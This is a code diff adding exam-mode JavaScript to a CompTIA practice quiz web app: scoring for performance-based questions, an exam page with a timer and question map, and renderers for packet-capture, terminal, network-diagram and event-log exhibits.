+      q.pairs[q.selLeft] = id;
+      q.selLeft = null;
+    } else {
+      var matchedLeft = Object.keys(q.pairs).find(function(k){ return q.pairs[k]===id; });
+      if (matchedLeft) delete q.pairs[matchedLeft];
+    }
+  }
+  renderExamQ();
+}
+
+function examLogPick(examIdx, qi, oi) {
+  var q = S.exam.qs[examIdx];
+  if (!q || q.checked) return;
+  if (!q.answers) q.answers = {};
+  q.answers[qi] = oi;
+  renderExamQ();
+}
+
+function examPBQCheck(examIdx) {
+  var q = S.exam.qs[examIdx];
+  if (!q || q.checked) return;
+  q.checked = true;
+  // Calculate score
+  if (q.sim === 'ordering') {
+    var sc = ORDERING_SCENARIOS[q.scIdx];
+    q.score = q.order.filter(function(id,i){ return sc.correct[i]===id; }).length;
+    q.maxScore = sc.items.length;
+  } else if (q.sim === 'matching') {
+    var sc2 = MATCHING_SCENARIOS[q.scIdx];
+    q.score = sc2.left.filter(function(l){ return (q.pairs||{})[l.id]===sc2.correct[l.id]; }).length;
+    q.maxScore = sc2.left.length;
+  } else if (q.sim === 'logs') {
+    var sc3 = LOG_SCENARIOS[q.scIdx];
+    q.score = sc3.qs.filter(function(sq,qi2){ return (q.answers||{})[qi2]===sq.a; }).length;
+    q.maxScore = sc3.qs.length;
+  }
+  // Mark as answered in exam — score normalized to 0 or 1 (partial credit if >50%)
+  S.exam.ans[examIdx] = q.score >= Math.ceil(q.maxScore / 2) ? q.maxScore : 0;
+  renderExamQ();
+}
+
+window.examOrdTap   = examOrdTap;
+window.examMatchSel = examMatchSel;
+window.examLogPick  = examLogPick;
+window.examPBQCheck = examPBQCheck;
+
+
+
+// ── EXAM PBQ FULL PAGE ──────────────────────────────────────────────────────
+function renderExamPBQPage(examIdx) {
+  var e = S.exam;
+  var q = e.qs[examIdx];
+  var answeredCount = e.ans.filter(function(a){ return a!==undefined; }).length;
+  var flaggedCount = (e.flagged||[]).length;
+
+  render(
+    "<div class='exam-bar'>" +
+      "<div style='display:flex;align-items:center;justify-content:space-between;max-width:1080px;margin:0 auto'>" +
+        "<div style='display:flex;align-items:center;gap:14px'>" +
+          "<div style='text-align:center'>" +
+            "<div style='font-family:Syne,sans-serif;font-size:18px;font-weight:800;color:var(--tx)' id='exam-timer'>" + fmtTime(e.timer) + "</div>" +
+            "<div style='font-size:9px;color:var(--tx3);letter-spacing:.5px'>TIME LEFT</div>" +
+          "</div>" +
+          "<div style='width:1px;height:32px;background:var(--bd)'></div>" +
+          "<div style='text-align:center'>" +
+            "<div style='font-size:16px;font-weight:700;color:var(--tx)'>" + answeredCount + "/" + e.qs.length + "</div>" +
+            "<div style='font-size:9px;color:var(--tx3);letter-spacing:.5px'>ANSWERED</div>" +
+          "</div>" +
+        "</div>" +
+        "<div style='flex:1;margin:0 16px'>" +
+          "<div style='height:4px;background:var(--bg4);border-radius:2px;overflow:hidden'>" +
+            "<div id='exam-tpb' style='height:100%;border-radius:2px;transition:width 1s linear;background:linear-gradient(90deg,var(--gn),var(--cy));width:" + (e.timer/e.maxTimer*100) + "%'></div>" +
+          "</div>" +
+        "</div>" +
+        "<button onclick='submitExam()' style='background:var(--pk0);border:1px solid rgba(244,114,182,.3);border-radius:10px;padding:8px 14px;color:var(--pk);font-size:12px;font-weight:700;font-family:inherit;cursor:pointer'>Submit Exam</button>" +
+      "</div>" +
+    "</div>" +
+
+    "<div class='pg' style='max-width:860px;margin:0 auto'>" +
+      // PBQ header
+      "<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:10px'>" +
+        "<div style='display:flex;align-items:center;gap:8px'>" +
+          "<span style='font-size:12px;color:var(--tx3)'>Question <b style='color:var(--tx)'>" + (examIdx+1) + "</b> of " + e.qs.length + "</span>" +
+          "<span style='font-size:10px;background:rgba(245,158,11,.15);border:1px solid rgba(245,158,11,.3);border-radius:8px;padding:3px 8px;color:var(--ye);font-weight:700'>PBQ</span>" +
+        "</div>" +
+        "<div style='font-size:11px;color:var(--tx3)'>Performance-Based Question</div>" +
+      "</div>" +
+
+      // PBQ title card
+      "<div class='card' style='margin-bottom:14px;padding:16px;border-color:rgba(245,158,11,.2)'>" +
+        "<div style='font-family:Syne,sans-serif;font-size:15px;font-weight:700;color:var(--ye);margin-bottom:4px'>" + q.title + "</div>" +
+        "<div style='font-size:12px;color:var(--tx3)'>Complete the interactive task below. Your score counts toward your exam total.</div>" +
+      "</div>" +
+
+      // PBQ content
+      renderExamPBQ(q, examIdx) +
+
+      // Navigation
+      "<div style='display:flex;gap:10px;margin-bottom:20px'>" +
+        (isNoGoBack() ? "" : "<button class='btn btn-s' style='flex:1' onclick='examNav(-1)' " + (examIdx===0?'disabled':'') + ">← Prev</button>") +
+        (examIdx < e.qs.length-1 ?
+          "<button class='btn btn-p' style='flex:1' onclick='examNav(1)'" + (!q.checked?' disabled style="flex:1;opacity:.4"':'') + ">" + (q.checked?'Next →':'Complete PBQ to continue') + "</button>"
+        : "<button class='btn btn-gn' style='flex:1' onclick='submitExam()'>Submit &amp; Review 🚩</button>") +
+      "</div>" +
+
+      // Question map
+      "<div class='card' style='padding:16px'>" +
+        "<div class='stitle'>Question Map</div>" +
+        "<div style='display:flex;flex-wrap:wrap;gap:6px'>" +
+          e.qs.map(function(qq,i) {
+            var isAns = e.ans[i]!==undefined;
+            var isCur = i===examIdx;
+            var isFlag = e.flagged && e.flagged.indexOf(i)>=0;
+            var isPBQ = qq.type==='pbq-exam';
+            var bg = isCur?'var(--cy)':isFlag?'var(--ye0)':isAns?'var(--gn0)':'var(--bg4)';
+            var border = isCur?'var(--cy)':isFlag?'var(--ye)':isAns?'var(--gn)':'var(--bd2)';
+            var color = isCur?'#fff':isFlag?'#7c4d00':isAns?'var(--gn)':'var(--tx3)';
+            return "<button onclick='examJump(" + i + ")' title='" + (isPBQ?'PBQ':'MC') + "' style='width:34px;height:34px;border-radius:8px;background:" + bg + ";border:1.5px solid " + border + ";color:" + color + ";font-size:" + (isPBQ?'8':'12') + "px;font-weight:700;cursor:pointer;font-family:inherit'>" + (isPBQ?'PBQ':'') + (isPBQ?'':String(i+1)) + "</button>";
+          }).join('') +
+        "</div>" +
+        "<div class='row' style='margin-top:12px;gap:16px;flex-wrap:wrap'>" +
+          "<div class='row' style='gap:5px'><div style='width:12px;height:12px;border-radius:3px;background:rgba(245,158,11,.15);border:1px solid var(--ye)'></div><span style='font-size:11px;color:var(--tx3)'>PBQ</span></div>" +
+          "<div class='row' style='gap:5px'><div style='width:12px;height:12px;border-radius:3px;background:var(--gn0);border:1px solid var(--gn)'></div><span style='font-size:11px;color:var(--tx3)'>Answered</span></div>" +
+          "<div class='row' style='gap:5px'><div style='width:12px;height:12px;border-radius:3px;background:var(--cy);border:1px solid var(--cy)'></div><span style='font-size:11px;color:var(--tx3)'>Current</span></div>" +
+        "</div>" +
+      "</div>" +
+    "</div>"
+  );
+}
+window.renderExamPBQPage = renderExamPBQPage;
+
+
+// ── VISUAL EXHIBIT SYSTEM ──
+// ═══════════════════════════════════════════════════════════════════════════════
+// EXHIBIT RENDERERS — Visual exhibits matching real CompTIA exam format
+// 4 types: Wireshark, Terminal/CLI, Network Diagram (SVG), Event Log
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// ── WIRESHARK PACKET CAPTURE ──────────────────────────────────────────────────
+function renderWiresharkExhibit(packets, filterInfo) {
+  var protoCols = {TCP:'#4da6ff',UDP:'#34d399',DNS:'#fbbf24',HTTP:'#fb923c',
+    HTTPS:'#34d399',TLS:'#34d399',ARP:'#a78bfa',ICMP:'#f472b6',SMB:'#fb923c',SMTP:'#fbbf24'};
+  var rows = packets.map(function(p,i) {
+    var col = protoCols[p.proto]||'#8b97c0';
+    var bg  = i%2===0?'rgba(255,255,255,.025)':'transparent';
+    return '<tr style="background:'+bg+'">' +
+      '<td style="padding:3px 8px;font-family:monospace;font-size:10.5px;color:#505d7e;width:32px">'+p.no+'</td>'+
+      '<td style="padding:3px 8px;font-family:monospace;font-size:10.5px;color:#e4e9f8;width:80px">'+p.time+'</td>'+
+      '<td style="padding:3px 8px;font-family:monospace;font-size:10.5px;color:#4da6ff;width:120px">'+p.src+'</td>'+
+      '<td style="padding:3px 8px;font-family:monospace;font-size:10.5px;color:#34d399;width:120px">'+p.dst+'</td>'+
+      '<td style="padding:3px 8px;width:64px"><span style="background:'+col+'22;color:'+col+';border-radius:4px;padding:1px 6px;font-family:monospace;font-size:10px;font-weight:700">'+p.proto+'</span></td>'+
+      '<td style="padding:3px 8px;font-family:monospace;font-size:10px;color:#505d7e;width:44px">'+p.len+'</td>'+
+      '<td style="padding:3px 8px;font-family:monospace;font-size:10px;color:#8b97c0">'+p.info+'</td>'+
+    '</tr>';
+  }).join('');
+  return '<div style="background:#0c0f1a;border:1px solid #2a3354;border-radius:10px;overflow:hidden;margin-bottom:14px">'+
+    '<div style="background:#141929;padding:6px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #1c2440">'+
+      '<div style="display:flex;gap:5px"><div style="width:10px;height:10px;border-radius:50%;background:#ef4444"></div><div style="width:10px;height:10px;border-radius:50%;background:#f59e0b"></div><div style="width:10px;height:10px;border-radius:50%;background:#10b981"></div></div>'+
+      '<span style="font-family:monospace;font-size:10.5px;color:#505d7e">Wireshark 4.0 — Packet Capture</span>'+
+      (filterInfo?'<span style="margin-left:auto;background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.25);border-radius:4px;padding:2px 8px;font-size:10px;color:#f59e0b;font-family:monospace">'+filterInfo+'</span>':'')+
+    '</div>'+
+    '<table style="width:100%;border-collapse:collapse;background:#0f1424;border-bottom:1px solid #1c2440">'+
+      '<tr style="font-size:9px;color:#3a4060;font-weight:700;letter-spacing:.5px">'+
+        '<th style="padding:3px 8px;text-align:left">No.</th><th style="padding:3px 8px;text-align:left">Time</th>'+
+        '<th style="padding:3px 8px;text-align:left">Source</th><th style="padding:3px 8px;text-align:left">Destination</th>'+
+        '<th style="padding:3px 8px;text-align:left">Protocol</th><th style="padding:3px 8px;text-align:left">Len</th>'+
+        '<th style="padding:3px 8px;text-align:left">Info</th></tr>'+
+    '</table>'+
+    '<div style="max-height:190px;overflow-y:auto"><table style="width:100%;border-collapse:collapse">'+rows+'</table></div>'+
+  '</div>';
+}
+
+// ── TERMINAL / CLI OUTPUT ─────────────────────────────────────────────────────
+function renderTerminalExhibit(title, lines, os) {
+  var isWin = os==='windows';
+  var content = lines.map(function(line) {
+    if(line.startsWith('CMD:'))  return '<div><span style="color:'+(isWin?'#e4e9f8':'#10b981')+';font-weight:700">'+(isWin?'C:\\\\> ':'$ ')+'</span><span style="color:#e4e9f8">'+line.slice(4)+'</span></div>';
+    if(line.startsWith('ERR:'))  return '<div style="color:#ef4444">'+line.slice(4)+'</div>';
+    if(line.startsWith('WARN:')) return '<div style="color:#f59e0b">'+line.slice(5)+'</div>';
+    if(line.startsWith('OK:'))   return '<div style="color:#10b981">'+line.slice(3)+'</div>';
+    if(line.startsWith('HDR:'))  return '<div style="color:#fbbf24;font-weight:700">'+line.slice(4)+'</div>';
+    if(line==='')                return '<div style="height:6px"></div>';
+    return '<div style="color:#8b97c0">'+line+'</div>';
+  }).join('');
+  return '<div style="background:#0c0f1a;border:1px solid #2a3354;border-radius:10px;overflow:hidden;margin-bottom:14px">'+
+    '<div style="background:#141929;padding:6px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #1c2440">'+
+      '<div style="display:flex;gap:5px"><div style="width:10px;height:10px;border-radius:50%;background:#ef4444"></div><div style="width:10px;height:10px;border-radius:50%;background:#f59e0b"></div><div style="width:10px;height:10px;border-radius:50%;background:#10b981"></div></div>'+
+      '<span style="font-family:monospace;font-size:10.5px;color:#505d7e">'+(isWin?'Windows PowerShell — Administrator':'Terminal — root@server')+(title?' — '+title:'')+'</span>'+
+    '</div>'+
+    '<div style="padding:12px 14px;font-family:monospace;font-size:11px;line-height:1.8;overflow-x:auto;max-height:220px;overflow-y:auto">'+content+'</div>'+
+  '</div>';
+}
+
+// ── SVG NETWORK DIAGRAM ───────────────────────────────────────────────────────
+function renderNetworkDiagram(scenario) {
+  var W=560, H=260;
+  var icons  = {router:'R',firewall:'FW',server:'SRV',workstation:'WS',internet:'NET',switch:'SW',attacker:'ATK',cloud:'☁'};
+  var colors = {router:'#4da6ff',firewall:'#ef4444',server:'#10b981',workstation:'#8b97c0',internet:'#f59e0b',switch:'#a78bfa',attacker:'#ef4444',cloud:'#4da6ff'};
+
+  var zones = (scenario.zones||[]).map(function(z) {
+    return '<rect x="'+z.x+'" y="'+z.y+'" width="'+z.w+'" height="'+z.h+'" rx="8" fill="'+(z.color||'#4da6ff')+'08" stroke="'+(z.color||'#4da6ff')+'" stroke-width="1" stroke-dasharray="5,3" opacity=".7"/>'+
+      '<text x="'+(z.x+8)+'" y="'+(z.y+14)+'" font-size="9" fill="'+(z.color||'#4da6ff')+'" font-family="DM Sans,sans-serif" font-weight="700" letter-spacing="1">'+z.label+'</text>';
+  }).join('');
+
+  var edges = (scenario.edges||[]).map(function(e) {
+    var from=scenario.nodes.find(function(n){return n.id===e.from;});
+    var to=scenario.nodes.find(function(n){return n.id===e.to;});
+    if(!from||!to)return '';
+    var mx=(from.x+to.x)/2, my=(from.y+to.y)/2;
+    return '<line x1="'+from.x+'" y1="'+from.y+'" x2="'+to.x+'" y2="'+to.y+'" stroke="'+(e.color||'#2a3354')+'" stroke-width="'+(e.width||1.5)+'" stroke-dasharray="'+(e.dashed?'5,3':'')+'" opacity=".8"/>'+
+      (e.label?'<text x="'+Math.round(mx)+'" y="'+(Math.round(my)-5)+'" text-anchor="middle" font-size="8" fill="#505d7e" font-family="monospace">'+e.label+'</text>':'');
+  }).join('');
+
+  var nodes = (scenario.nodes||[]).map(function(n) {
+    var col=n.color||colors[n.type]||'#8b97c0';
+    var lbl=icons[n.type]||'?';
+    return '<g>'+
+      '<circle cx="'+n.x+'" cy="'+n.y+'" r="20" fill="'+col+'14" stroke="'+col+'" stroke-width="1.5"/>'+
+      '<text x="'+n.x+'" y="'+(n.y+4)+'" text-anchor="middle" font-size="10" fill="'+col+'" font-family="monospace" font-weight="700">'+lbl+'</text>'+
+      '<text x="'+n.x+'" y="'+(n.y+33)+'" text-anchor="middle" font-size="9" fill="#e4e9f8" font-family="DM Sans,sans-serif" font-weight="600">'+n.label+'</text>'+
+      (n.sublabel?'<text x="'+n.x+'" y="'+(n.y+44)+'" text-anchor="middle" font-size="8" fill="#505d7e" font-family="monospace">'+n.sublabel+'</text>':'')+
+    '</g>';
+  }).join('');
+
+  return '<div style="background:#0c0f1a;border:1px solid #2a3354;border-radius:10px;overflow:hidden;margin-bottom:14px">'+
+    '<div style="background:#141929;padding:6px 12px;border-bottom:1px solid #1c2440;font-family:monospace;font-size:10.5px;color:#505d7e">'+
+      '🌐 '+(scenario.title||'Network Diagram')+
+    '</div>'+
+    '<div style="padding:12px;overflow-x:auto">'+
+      '<svg viewBox="0 0 '+W+' '+H+'" style="width:100%;max-width:'+W+'px;height:'+H+'px">'+
+        zones+edges+nodes+
+      '</svg>'+
+    '</div>'+
+  '</div>';
+}
+
+// ── WINDOWS / LINUX EVENT LOG ─────────────────────────────────────────────────
+function renderEventLogExhibit(events, title) {
+  var lvlCol  = {Critical:'#ef4444',Error:'#ef4444',Warning:'#f59e0b',Information:'#4da6ff','Audit Success':'#10b981','Audit Failure':'#ef4444'};
+  var lvlIcon = {Critical:'🔴',Error:'🔴',Warning:'🟡',Information:'🔵','Audit Success':'🟢','Audit Failure':'🔴'};
+  var rows = events.map(function(ev,i){
+    var col=lvlCol[ev.level]||'#8b97c0';
+    var bg=i%2===0?'rgba(255,255,255,.025)':'transparent';
+    return '<tr style="background:'+bg+'">'+
+      '<td style="padding:4px 6px;font-size:12px;width:20px">'+(lvlIcon[ev.level]||'⚪')+'</td>'+
+      '<td style="padding:4px 8px;font-family:monospace;font-size:10px;color:'+col+';width:100px;font-weight:700">'+ev.level+'</td>'+
+      '<td style="padding:4px 8px;font-family:monospace;font-size:10px;color:#505d7e;white-space:nowrap">'+ev.time+'</td>'+
+      '<td style="padding:4px 8px;font-family:monospace;font-size:10px;color:#fbbf24;width:60px">'+ev.id+'</td>'+
+      '<td style="padding:4px 8px;font-family:monospace;font-size:10px;color:#8b97c0;width:90px">'+ev.source+'</td>'+
+      '<td style="padding:4px 8px;font-size:11px;color:#e4e9f8;line-height:1.5">'+ev.message+'</td>'+
+    '</tr>';
+  }).join('');
+  return '<div style="background:#0c0f1a;border:1px solid #2a3354;border-radius:10px;overflow:hidden;margin-bottom:14px">'+
+    '<div style="background:#141929;padding:6px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #1c2440">'+
+      '<div style="display:flex;gap:5px"><div style="width:10px;height:10px;border-radius:50%;background:#ef4444"></div><div style="width:10px;height:10px;border-radius:50%;background:#f59e0b"></div><div style="width:10px;height:10px;border-radius:50%;background:#10b981"></div></div>'+
+      '<span style="font-family:monospace;font-size:10.5px;color:#505d7e">Event Viewer — '+(title||'Security Log')+'</span>'+
+    '</div>'+
+    '<table style="width:100%;border-collapse:collapse;background:#0f1424;border-bottom:1px solid #1c2440">'+
+      '<tr style="font-size:9px;color:#3a4060;font-weight:700;letter-spacing:.5px">'+
+        '<th style="padding:3px 6px;text-align:left"></th>'+
+        '<th style="padding:3px 8px;text-align:left">LEVEL</th>'+
+        '<th style="padding:3px 8px;text-align:left">DATE/TIME</th>'+
+        '<th style="padding:3px 8px;text-align:left">ID</th>'+
+        '<th style="padding:3px 8px;text-align:left">SOURCE</th>'+
+        '<th style="padding:3px 8px;text-align:left">MESSAGE</th>'+
+      '</tr>'+
+    '</table>'+
+    '<div style="max-height:190px;overflow-y:auto"><table style="width:100%;border-collapse:collapse">'+rows+'</table></div>'+
+  '</div>';
+}
+
+// ── EXHIBIT QUESTIONS WITH VISUAL EXHIBITS ────────────────────────────────────
+// These questions render a visual exhibit before the options in quiz/exam mode
+// Format: add exhibit:{type, data} to a question object
+
+function renderExhibitForQuestion(q) {
+  if(!q || !q.exhibit) return '';
+  var ex = q.exhibit;
+  if(ex.type === 'wireshark')    return renderWiresharkExhibit(ex.packets, ex.filter);
+  if(ex.type === 'terminal')     return renderTerminalExhibit(ex.title, ex.lines, ex.os);
+  if(ex.type === 'network')      return renderNetworkDiagram(ex.scenario);
+  if(ex.type === 'eventlog')     return renderEventLogExhibit(ex.events, ex.title);
+  return '';
+}
+window.renderExhibitForQuestion = renderExhibitForQuestion;
+window.renderWiresharkExhibit   = renderWiresharkExhibit;
+window.renderTerminalExhibit    = renderTerminalExhibit;
+window.renderNetworkDiagram     = renderNetworkDiagram;
+window.renderEventLogExhibit    = renderEventLogExhibit;
+
+// ── VISUAL EXHIBIT QUESTION BANK ─────────────────────────────────────────────
+// 20 high-quality exhibit questions covering all 4 exhibit types
+
+
 </script>
 </body>
 </html>
